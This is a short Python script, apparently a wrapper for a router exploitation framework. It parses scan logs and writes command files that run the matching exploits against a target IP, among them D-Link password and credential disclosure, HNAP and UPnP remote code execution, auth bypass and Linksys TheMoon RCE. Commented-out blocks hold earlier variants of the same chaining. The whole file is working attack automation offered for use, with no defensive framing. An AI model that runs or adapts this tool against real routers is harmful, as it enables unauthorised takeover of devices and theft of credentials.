
import sys

# sys.argv[1] -scan
# sys.argv[2] uuid/static
# sys.argv[3] ip


def target_only(exploit, ip):
    writeData.append('use '+exploit+'\n')
    writeData.append('set target '+ip+'\n')
    writeData.append('run'+'\n')

def shell_exit():
    writeData.append('exit'+'\n')

if sys.argv[1] == '-cmd':
    with open('cmd.txt', 'w') as f:
        f.write("use scanners/routers/router_scan\n")
        f.write(''.join(["set target ",sys.argv[3],'\n']))
        f.write("run\n")


if sys.argv[1] == '-scan':
    output = []
    writeData = []

    with open(''.join([sys.argv[2], '/scanLog.txt']), 'r') as f:
        content_list = f.read().splitlines()

    for content in content_list:
        if content.find("92m[+]") != -1 and content.find("Device") == -1 and content.find("=>") == -1:
            c = content.split(' ')
            output.append(c[3])

    for o in output:
        if str(o).find("exploits/routers/dlink/dir_8xx_password_disclosure")!= -1:
            target_only(o, sys.argv[3])
        elif str(o).find("exploits/routers/dlink/multi_hnap_rce")!= -1:
            target_only(o, sys.argv[3])
            shell_exit()
        elif str(o).find("exploits/routers/dlink/dir_850l_creds_disclosure")!= -1:
            target_only(o, sys.argv[3])
        elif str(o).find("exploits/routers/dlink/dir_300_645_815_upnp_rce")!= -1:
            target_only(o, sys.argv[3])
        elif str(o).find("exploits/routers/dlink/dir_300_320_615_auth_bypass")!= -1:
            target_only(o, sys.argv[3])
        elif str(o).find("exploits/routers/linksys/eseries_themoon_rce")!= -1:
            target_only(o, sys.argv[3])
        

    with open(''.join([sys.argv[2], '/searchCmd.txt']), 'w') as f:
        for w in writeData:
            f.write(w)


'''
if sys.argv[1] == '-scan':
    output = []

    with open(''.join([sys.argv[2], '/scan.txt']), 'r') as f:
        content_list = f.read().splitlines()

    for content in content_list:
        if content.find("92m[+]") != -1 and content.find("Device") == -1 and content.find("=>") == -1:
            c = content.split(' ')
            output.append(c[3])

    with open(''.join([sys.argv[2], '/searchCmd.txt']), 'w') as f:
        for t in output:
            f.write("use "+t+"\n")
            f.write("show options\n")

'''

'''
elif sys.argv[1] == '-b':

    output = []
    flag = 0

    with open('log2.txt', 'r') as f:
        command_list = f.read().splitlines()

    with open('log3.txt', 'r') as f:
        content_list = f.read().splitlines()

    for content in content_list:

        if content.find("Target options") != -1:
            o = command_list.pop(0)
            if o.find("rce") != -1:
                flag = 1

            output.append(o)
            command_list.pop(0)

        if content.find("target") != -1:
            output.append("set target "+sys.argv[2])
            output.append("run")

            print(flag)
            if flag == 1:
                output.append("exit")

            flag = 0

    with open('log4.txt', 'w') as f:
        for t in output:
            f.write(t+"\n")
'''
